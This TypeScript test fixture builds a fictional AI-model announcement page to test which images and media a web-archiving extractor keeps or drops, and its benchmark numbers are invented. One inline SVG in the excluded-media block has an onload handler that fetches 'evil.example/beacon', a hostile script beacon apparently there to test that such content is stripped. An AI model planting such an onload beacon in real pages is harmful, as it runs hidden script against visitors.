import { makePng } from './raster-fixtures';
import { rasterFormatFixtures } from './extended-raster-fixtures';

/**
 * A minimal stand-in for the kind of model-announcement page this feature was
 * built for.
 *
 * It is written from scratch rather than copied: the prose, the benchmark
 * names, and the numbers are invented, and no automated test contacts the page
 * that inspired it. What is reproduced is its *shape* — several seven-column
 * benchmark tables, one of which styles its header row with `<strong>` instead
 * of `<th>`, an editorial raster in a captioned figure, a canvas hero backed
 * only by an Open Graph card, a vector chart, video and interactive figures
 * that carry their meaning in the caption, and the usual page chrome.
 *
 * Both the HTML and the "previous slice" Markdown are generated from the same
 * content data below, so the before/after evidence compares two renderings of
 * one article rather than two hand-written strings that might drift apart.
 */

export const ASTRA_ARTICLE_URL = 'https://example.com/index/astra-model/';
const ASTRA_SITE_NAME = 'Example Research';
const ASTRA_TITLE = 'Astra: a new generation of assistants';
const ASTRA_AUTHOR = 'The Example Research Team';

const CDN = 'https://cdn.example.com';
/** Used only by the `withBase` variant, to prove `<base href>` wins over the response URL. */
const ASTRA_BASE_HREF = `${CDN}/assets/`;

/**
 * Every image URL the fixture publishes, split by what the extractor should do
 * with it. The archived set is what the media transport is asked for; the
 * excluded set must never be requested.
 */
export const ASTRA_IMAGE_URLS = {
  /** Open Graph card, the only static hero a canvas-drawn page offers. */
  hero: `${CDN}/astra/social-card.png`,
  /** The editorial comparison raster, inside a captioned figure. */
  comparison: `${CDN}/astra/human-review-comparison.png`,
  /** Written as a document-relative path; resolved against the response URL. */
  relative: `${ASTRA_ARTICLE_URL}media/sample-frames.png`,
  /** A document-relative JPEG, the common editorial photo format. */
  relativeJpeg: `${ASTRA_ARTICLE_URL}media/keyboard-plate.jpg`,
  /** The same relative path, resolved against `<base href>` instead. */
  relativeUnderBase: `${ASTRA_BASE_HREF}media/sample-frames.png`,
  /** Widest `srcset` candidate; the narrow one must lose. */
  srcsetWide: `${CDN}/astra/scaling-960.png`,
  srcsetNarrow: `${CDN}/astra/scaling-320.png`,
  /** Parked in `data-src` behind an inline placeholder. */
  lazy: `${CDN}/astra/latency-profile.png`,
  /** The `<img>` fallback inside a `<picture>` whose first source is vector. */
  pictureFallback: `${CDN}/astra/training-curve.png`,
  siteLogo: `${CDN}/site/logo.png`,
  shareIcon: `${CDN}/site/icon-share.png`,
  trackingPixel: 'https://metrics.example.com/pixel.gif',
  decorativeDivider: `${CDN}/astra/divider.png`,
  unlabelledBand: `${CDN}/astra/spacer-band.png`,
  vectorChart: `${CDN}/astra/scaling-chart.svg`,
  pictureVectorSource: `${CDN}/astra/training-curve.svg`,
} as const;

/** The images a successful capture of the default fixture should archive, in reading order. */
export const ASTRA_ARCHIVED_IMAGE_URLS: readonly string[] = [
  ASTRA_IMAGE_URLS.comparison,
  ASTRA_IMAGE_URLS.relative,
  ASTRA_IMAGE_URLS.relativeJpeg,
  ASTRA_IMAGE_URLS.srcsetWide,
  ASTRA_IMAGE_URLS.lazy,
  ASTRA_IMAGE_URLS.pictureFallback,
];


/** URLs that must never be fetched, because they are chrome, vector, or noise. */
export const ASTRA_EXCLUDED_IMAGE_URLS: readonly string[] = [
  ASTRA_IMAGE_URLS.siteLogo,
  ASTRA_IMAGE_URLS.shareIcon,
  ASTRA_IMAGE_URLS.trackingPixel,
  ASTRA_IMAGE_URLS.decorativeDivider,
  ASTRA_IMAGE_URLS.unlabelledBand,
  ASTRA_IMAGE_URLS.vectorChart,
  ASTRA_IMAGE_URLS.pictureVectorSource,
  ASTRA_IMAGE_URLS.srcsetNarrow,
];

export const ASTRA_ALT_TEXT = {
  comparison: 'Side-by-side transcripts of two assistants answering the same question',
  relative: 'Four sampled video frames with the model annotations drawn over them',
  relativeJpeg: 'The anodised aluminium keyboard plate before assembly',
  srcset: 'Accuracy plotted against training compute for three model sizes',
  lazy: 'Response latency by prompt length',
  picture: 'Training loss curve flattening after the second stage',
  hero: 'The Astra announcement card',
} as const;

export const ASTRA_CAPTIONS = {
  comparison: 'Reviewers preferred the Astra transcript in most of the paired comparisons.',
  video: 'Astra narrating a chart it produced a moment earlier.',
  interactive: 'A playground for trying the model on your own prompts.',
  relativeJpeg: 'The plate is milled from a single aluminium sheet.',
} as const;

type BenchmarkTable = {
  readonly caption: string;
  readonly headers: readonly string[];
  readonly rows: readonly (readonly string[])[];
  /** How the page marks its header row: a real `<thead>`, or a bold first row. */
  readonly headerStyle: 'thead' | 'strong-row';
};

const SHARED_COLUMNS: readonly string[] = [
  'Astra',
  'Astra mini',
  'Previous flagship',
  'Open baseline',
  'Expert panel',
  'Notes',
];

/** Two seven-column tables that differ only in how the header row is marked. */
export const ASTRA_TABLES: readonly BenchmarkTable[] = [
  {
    caption: 'Text reasoning evaluations, higher is better.',
    headers: ['Benchmark', ...SHARED_COLUMNS],
    headerStyle: 'thead',
    rows: [
      ['Graduate reasoning', '86.4%', '79.1%', '71.8%', '64.2%', '82.0%', 'Zero-shot'],
      ['Long-context recall', '94.2%', '88.7%', '80.3%', '69.9%', '96.1%', '128k tokens'],
      ['Tool use', '73.5%', '65.0%', '58.4%', '41.6%', '77.3%', 'Five runs, averaged'],
    ],
  },
  {
    caption: 'Multimodal evaluations, higher is better.',
    headers: ['Evaluation', ...SHARED_COLUMNS],
    headerStyle: 'strong-row',
    rows: [
      ['Chart reading', '88.9%', '81.2%', '74.6%', '60.1%', '91.4%', 'Single image'],
      ['Video question answering', '77.2%', '70.4%', '63.9%', '52.8%', '85.6%', 'Two-minute clips'],
      // The last cell carries a literal pipe, which a pipe table has to escape
      // rather than let shear the row into eight columns.
      ['Document extraction', '91.0%', '84.3%', '77.7%', '66.5%', '93.2%', 'Scanned pages | mixed scripts'],
    ],
  },
];

/** The one cell that also carries a link, so cell links can be asserted. */
export const ASTRA_LINKED_CELL = {
  table: 0,
  row: 2,
  column: 6,
  href: 'https://example.com/evals/tool-use',
} as const;

const PARAGRAPHS: readonly string[] = [
  'Astra is our new generation of assistant models, trained to hold a longer thread of reasoning and to work with pictures, documents, and video in the same conversation. It is available today to everyone with an account, and to developers through the same interface as the previous generation.',
  'The tables below report the evaluations we run before every release. Numbers are single-run unless the notes say otherwise, and the expert panel column is the score a small group of human specialists reached on the same questions, which is the ceiling we measure ourselves against rather than a target we expect to pass.',
  'Two things changed most since the previous flagship. Long-context recall improved enough that the model can be handed an entire report and asked about a footnote, and tool use improved enough that a wrong tool call is now the exception rather than the ordinary case.',
];

const CLOSING_PARAGRAPH =
  'We are publishing the evaluation harness alongside the model so the numbers above can be reproduced, and we will keep updating this page as independent results arrive.';

function escapeHtml(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function cellHtml(table: BenchmarkTable, tableIndex: number, rowIndex: number, columnIndex: number): string {
  const text = escapeHtml(table.rows[rowIndex]?.[columnIndex] ?? '');
  const linked =
    tableIndex === ASTRA_LINKED_CELL.table &&
    rowIndex === ASTRA_LINKED_CELL.row &&
    columnIndex === ASTRA_LINKED_CELL.column;
  return linked ? `<a href="${ASTRA_LINKED_CELL.href}">${text}</a>` : text;
}

function tableHtml(table: BenchmarkTable, tableIndex: number): string {
  const headerCells = table.headers
    .map((header) =>
      table.headerStyle === 'thead'
        ? `<th scope="col">${escapeHtml(header)}</th>`
        : `<td><strong>${escapeHtml(header)}</strong></td>`
    )
    .join('');
  const headerRow =
    table.headerStyle === 'thead'
      ? `<thead><tr>${headerCells}</tr></thead>`
      : `<tr>${headerCells}</tr>`;
  const bodyRows = table.rows
    .map(
      (row, rowIndex) =>
        `<tr>${row
          .map((_cell, columnIndex) => `<td>${cellHtml(table, tableIndex, rowIndex, columnIndex)}</td>`)
          .join('')}</tr>`
    )
    .join('');
  const body =
    table.headerStyle === 'thead'
      ? `${headerRow}<tbody>${bodyRows}</tbody>`
      : `<tbody>${headerRow}${bodyRows}</tbody>`;
  return `<table class="benchmark"><caption>${escapeHtml(table.caption)}</caption>${body}</table>`;
}

export type AstraFixtureOptions = {
  /** Adds a `<base href>` the relative image must resolve against instead of the page URL. */
  readonly withBase?: boolean;
  /** Drops every body image, leaving only the canvas hero and its Open Graph card. */
  readonly withoutBodyImages?: boolean;
  /** Omits the Open Graph card, so a canvas-only page has no hero at all. */
  readonly withoutOpenGraphImage?: boolean;
};

function bodyImagesHtml(): string {
  return `
    <figure class="editorial">
      <img src="${ASTRA_IMAGE_URLS.comparison}" alt="${ASTRA_ALT_TEXT.comparison}" width="1200" height="700">
      <figcaption>${ASTRA_CAPTIONS.comparison}</figcaption>
    </figure>
    <p>The sampled frames below show what the model was looking at while it answered.</p>
    <img src="media/sample-frames.png" alt="${ASTRA_ALT_TEXT.relative}" width="960" height="540">
    <figure>
      <img src="media/keyboard-plate.jpg" alt="${ASTRA_ALT_TEXT.relativeJpeg}" width="640" height="480">
      <figcaption>${ASTRA_CAPTIONS.relativeJpeg}</figcaption>
    </figure>
    <img
      src="${ASTRA_IMAGE_URLS.srcsetNarrow}"
      srcset="${ASTRA_IMAGE_URLS.srcsetNarrow} 320w, ${ASTRA_IMAGE_URLS.srcsetWide} 960w"
      sizes="(max-width: 600px) 320px, 960px"
      alt="${ASTRA_ALT_TEXT.srcset}" width="960" height="540">
    <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="
      data-src="${ASTRA_IMAGE_URLS.lazy}" loading="lazy"
      alt="${ASTRA_ALT_TEXT.lazy}" width="800" height="450">
    <picture>
      <source type="image/svg+xml" srcset="${ASTRA_IMAGE_URLS.pictureVectorSource}">
      <img src="${ASTRA_IMAGE_URLS.pictureFallback}" alt="${ASTRA_ALT_TEXT.picture}" width="800" height="450">
    </picture>`;
}

/** Page furniture and unarchivable media, all of which must be dropped. */
function excludedMediaHtml(): string {
  return `
    <img src="${ASTRA_IMAGE_URLS.trackingPixel}" alt="" width="1" height="1">
    <img src="${ASTRA_IMAGE_URLS.shareIcon}" alt="Share this page" width="24" height="24">
    <img src="${ASTRA_IMAGE_URLS.decorativeDivider}" alt="" role="presentation" width="1200" height="8">
    <img src="${ASTRA_IMAGE_URLS.unlabelledBand}" alt="" width="1200" height="200">
    <img src="${ASTRA_IMAGE_URLS.vectorChart}" alt="Scaling behaviour across model sizes" width="900" height="500">
    <svg viewBox="0 0 900 500" width="900" height="500" onload="fetch('https://evil.example/beacon')">
      <title>Scaling behaviour across model sizes</title>
      <rect width="900" height="500"></rect>
    </svg>
    <figure>
      <video src="${CDN}/astra/demo.mp4" controls poster="${CDN}/astra/demo-poster.png"></video>
      <figcaption>${ASTRA_CAPTIONS.video}</figcaption>
    </figure>
    <figure>
      <iframe src="https://example.com/embeds/astra-playground" title="Astra playground" width="800" height="600"></iframe>
      <figcaption>${ASTRA_CAPTIONS.interactive}</figcaption>
    </figure>`;
}

export function astraArticleHtml(options: AstraFixtureOptions = {}): string {
  const base = options.withBase === true ? `<base href="${ASTRA_BASE_HREF}">` : '';
  const openGraphImage =
    options.withoutOpenGraphImage === true
      ? ''
      : `<meta property="og:image" content="${ASTRA_IMAGE_URLS.hero}">
  <meta property="og:image:alt" content="${ASTRA_ALT_TEXT.hero}">`;
  const bodyImages = options.withoutBodyImages === true ? '' : bodyImagesHtml();

  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  ${base}
  <title>${ASTRA_TITLE} | ${ASTRA_SITE_NAME}</title>
  <meta name="author" content="${ASTRA_AUTHOR}">
  <meta property="og:site_name" content="${ASTRA_SITE_NAME}">
  <meta property="og:title" content="${ASTRA_TITLE}">
  ${openGraphImage}
</head>
<body>
  <header>
    <nav aria-label="Site">
      <a href="/"><img src="${ASTRA_IMAGE_URLS.siteLogo}" alt="Example Research" width="120" height="32"></a>
      <a href="/research">Research</a>
      <a href="/products">Products</a>
    </nav>
  </header>
  <main>
    <div class="hero">
      <canvas id="hero-animation" width="1200" height="600" aria-label="${ASTRA_ALT_TEXT.hero}"></canvas>
    </div>
    <article class="post-body">
      <h1>${ASTRA_TITLE}</h1>
      <p class="byline">By ${ASTRA_AUTHOR}</p>
      <p>${PARAGRAPHS[0] ?? ''}</p>
      ${bodyImages}
      <h2>Evaluations</h2>
      <p>${PARAGRAPHS[1] ?? ''}</p>
      ${tableHtml(ASTRA_TABLES[0]!, 0)}
      <p>${PARAGRAPHS[2] ?? ''}</p>
      ${tableHtml(ASTRA_TABLES[1]!, 1)}
      ${excludedMediaHtml()}
      <h2>Availability</h2>
      <p>${CLOSING_PARAGRAPH}</p>
    </article>
  </main>
  <footer>
    <p>© 2026 Example Research. All rights reserved.</p>
  </footer>
</body>
</html>`;
}

type MediaFixture = { readonly base64: string; readonly contentType: string };

/**
 * Real encoded bytes for every archivable image in the fixture.
 *
 * Each one is a different size and colour so the tests can tell which asset
 * ended up where, and so no two of them collide under content addressing. The
 * editorial photograph is a JPEG, served with its real content type, so the
 * live admission path decodes it through the same isolated worker a web
 * import uses.
 */
export function astraMediaFixtures(): Record<string, MediaFixture> {
  const png = (width: number, height: number, colour: readonly [number, number, number]): MediaFixture => ({
    base64: makePng(width, height, colour).toString('base64'),
    contentType: 'image/png',
  });
  return {
    [ASTRA_IMAGE_URLS.comparison]: png(240, 140, [24, 84, 200]),
    [ASTRA_IMAGE_URLS.relative]: png(200, 112, [200, 96, 24]),
    [ASTRA_IMAGE_URLS.relativeUnderBase]: png(200, 112, [200, 96, 24]),
    [ASTRA_IMAGE_URLS.relativeJpeg]: {
      base64: rasterFormatFixtures().colourJpeg.toString('base64'),
      contentType: 'image/jpeg',
    },
    [ASTRA_IMAGE_URLS.srcsetWide]: png(192, 108, [32, 160, 96]),
    [ASTRA_IMAGE_URLS.lazy]: png(160, 90, [160, 32, 128]),
    [ASTRA_IMAGE_URLS.pictureFallback]: png(160, 90, [96, 96, 32]),
    [ASTRA_IMAGE_URLS.hero]: png(256, 134, [40, 40, 40]),
  };
}
